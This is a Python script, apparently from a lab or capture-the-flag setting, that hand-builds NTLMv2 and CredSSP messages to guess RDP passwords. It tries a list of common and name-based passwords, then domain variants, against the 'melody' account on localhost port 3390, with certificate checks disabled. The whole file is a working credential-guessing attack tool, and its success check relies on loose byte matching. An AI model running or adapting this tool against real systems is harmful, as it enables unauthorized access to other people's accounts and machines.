import socket
import struct
import ssl
import hashlib
import hmac
import os
import time

def md4(data):
    return hashlib.new('md4', data).digest()

def ntlm_hash(password):
    return md4(password.encode('utf-16le'))

def ntlmv2_response(nt_hash, user, domain, server_challenge, client_challenge, timestamp, target_info):
    user_domain = (user.upper() + domain.upper()).encode('utf-16le')
    ntlmv2_hash = hmac.new(nt_hash, user_domain, 'md5').digest()
    
    blob = b'\x01\x01\x00\x00\x00\x00\x00\x00'
    blob += timestamp
    blob += client_challenge
    blob += b'\x00\x00\x00\x00'
    blob += target_info
    blob += b'\x00\x00\x00\x00'
    
    nt_proof = hmac.new(ntlmv2_hash, server_challenge + blob, 'md5').digest()
    return nt_proof + blob

def create_ntlm_auth(user, password, domain, challenge, target_info, timestamp):
    nt_hash = ntlm_hash(password)
    client_challenge = os.urandom(8)
    
    nt_response = ntlmv2_response(nt_hash, user, domain, challenge, client_challenge, timestamp, target_info)
    
    session_base_key = hmac.new(
        hmac.new(nt_hash, (user.upper() + domain.upper()).encode('utf-16le'), 'md5').digest(),
        nt_response[:16],
        'md5'
    ).digest()
    
    domain_bytes = domain.encode('utf-16le')
    user_bytes = user.encode('utf-16le')
    workstation = b'W\x00O\x00R\x00K\x00S\x00T\x00A\x00T\x00I\x00O\x00N\x00'
    
    lm_response = client_challenge + b'\x00' * 16
    
    auth_msg = b'NTLMSSP\x00\x03\x00\x00\x00'
    
    offset = 88
    
    auth_msg += struct.pack('<HH', len(lm_response), len(lm_response))
    lm_offset = offset
    offset += len(lm_response)
    auth_msg += struct.pack('<I', lm_offset)
    
    auth_msg += struct.pack('<HH', len(nt_response), len(nt_response))
    nt_offset = offset
    offset += len(nt_response)
    auth_msg += struct.pack('<I', nt_offset)
    
    auth_msg += struct.pack('<HH', len(domain_bytes), len(domain_bytes))
    domain_offset = offset
    offset += len(domain_bytes)
    auth_msg += struct.pack('<I', domain_offset)
    
    auth_msg += struct.pack('<HH', len(user_bytes), len(user_bytes))
    user_offset = offset
    offset += len(user_bytes)
    auth_msg += struct.pack('<I', user_offset)
    
    auth_msg += struct.pack('<HH', len(workstation), len(workstation))
    ws_offset = offset
    offset += len(workstation)
    auth_msg += struct.pack('<I', ws_offset)
    
    auth_msg += struct.pack('<HH', 0, 0)
    auth_msg += struct.pack('<I', offset)
    
    auth_msg += struct.pack('<I', 0xe2888235)
    
    auth_msg += b'\x0a\x00\xc5\x52\x00\x00\x00\x0f'
    
    auth_msg += lm_response
    auth_msg += nt_response
    auth_msg += domain_bytes
    auth_msg += user_bytes
    auth_msg += workstation
    
    return auth_msg, session_base_key

def try_rdp_password(host, port, username, password, domain=""):
    print(f"    Trying {username}:{password}...", end=" ", flush=True)
    
    try:
        cookie = f"Cookie: mstshash={username}\r\n".encode()
        neg = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
        x224 = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg
        cr = bytes([0x03, 0x00]) + struct.pack(">H", 5 + len(x224)) + bytes([len(x224)]) + x224
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        sock.sendall(cr)
        resp = sock.recv(1024)
        
        if resp[5] != 0xd0:
            print("REJECTED")
            return False
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
        
        ntlm_negotiate = (
            b"NTLMSSP\x00"
            b"\x01\x00\x00\x00"
            b"\x97\x82\x08\xe2"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x0a\x00\x63\x45\x00\x00\x00\x0f"
        )
        
        credssp_neg = bytes([
            0x30, 0x37,
            0xa0, 0x03, 0x02, 0x01, 0x06,
            0xa1, 0x30, 0x30, 0x2e, 0x30, 0x2c,
            0xa0, 0x2a, 0x04, 0x28
        ]) + ntlm_negotiate
        
        ssl_sock.send(credssp_neg)
        challenge_resp = ssl_sock.recv(4096)
        
        if b"NTLMSSP" not in challenge_resp:
            print("NO CHALLENGE")
            ssl_sock.close()
            return False
        
        ntlm_start = challenge_resp.find(b"NTLMSSP")
        ntlm_msg = challenge_resp[ntlm_start:]
        
        challenge = ntlm_msg[24:32]
        
        flags = struct.unpack("<I", ntlm_msg[20:24])[0]
        
        target_info_len = struct.unpack("<H", ntlm_msg[40:42])[0]
        target_info_offset = struct.unpack("<I", ntlm_msg[44:48])[0]
        target_info = ntlm_msg[target_info_offset:target_info_offset+target_info_len]
        
        timestamp = None
        i = 0
        while i < len(target_info) - 4:
            av_id = struct.unpack("<H", target_info[i:i+2])[0]
            av_len = struct.unpack("<H", target_info[i+2:i+4])[0]
            if av_id == 7:
                timestamp = target_info[i+4:i+4+av_len]
                break
            i += 4 + av_len
        
        if timestamp is None:
            timestamp = struct.pack("<Q", int(time.time() * 10000000) + 116444736000000000)
        
        auth_msg, session_key = create_ntlm_auth(username, password, domain, challenge, target_info, timestamp)
        
        auth_token_len = len(auth_msg)
        credssp_auth = bytes([
            0x30, 0x82
        ]) + struct.pack(">H", auth_token_len + 20)
        credssp_auth += bytes([
            0xa0, 0x03, 0x02, 0x01, 0x06,
            0xa2
        ])
        credssp_auth += bytes([0x82]) + struct.pack(">H", auth_token_len + 8)
        credssp_auth += bytes([0x30, 0x82]) + struct.pack(">H", auth_token_len + 4)
        credssp_auth += bytes([0x30, 0x82]) + struct.pack(">H", auth_token_len)
        credssp_auth += bytes([0xa0, 0x82]) + struct.pack(">H", auth_token_len - 4)
        credssp_auth += bytes([0x04, 0x82]) + struct.pack(">H", auth_token_len - 8)
        credssp_auth += auth_msg
        
        ssl_sock.send(credssp_auth)
        
        auth_result = ssl_sock.recv(4096)
        
        if len(auth_result) > 0:
            if b'\xa3' in auth_result[:20]:
                print("SUCCESS!")
                ssl_sock.close()
                return True
            elif b'\x30' in auth_result[:5] and len(auth_result) > 50:
                print("POSSIBLE SUCCESS")
                ssl_sock.close()
                return True
            else:
                print(f"FAILED (resp: {len(auth_result)}b)")
        else:
            print("NO RESPONSE")
        
        ssl_sock.close()
        return False
        
    except ssl.SSLError as e:
        if "internal error" in str(e).lower():
            print("AUTH FAILED")
        else:
            print(f"SSL ERROR")
        return False
    except Exception as e:
        print(f"ERROR: {e}")
        return False

print("=== CREDSSP PASSWORD AUTHENTICATION ===\n")

passwords_to_try = [
    "", "melody", "Melody", "melody123", "Melody123",
    "password", "Password1", "Welcome1", "admin",
    "123456", "qwerty", "letmein", "meltat0",
]

print("[1] Testing passwords for 'melody' account...")
for pwd in passwords_to_try:
    if try_rdp_password("localhost", 3390, "melody", pwd, ""):
        print(f"\n[!] SUCCESS: melody:{pwd}")
        break
    time.sleep(0.3)

print("\n[2] Testing with domain variations...")
domains = ["", "meltat0", "MELTAT0", "."]
for domain in domains:
    if try_rdp_password("localhost", 3390, "melody", "melody", domain):
        print(f"\n[!] SUCCESS with domain: {domain}")
        break
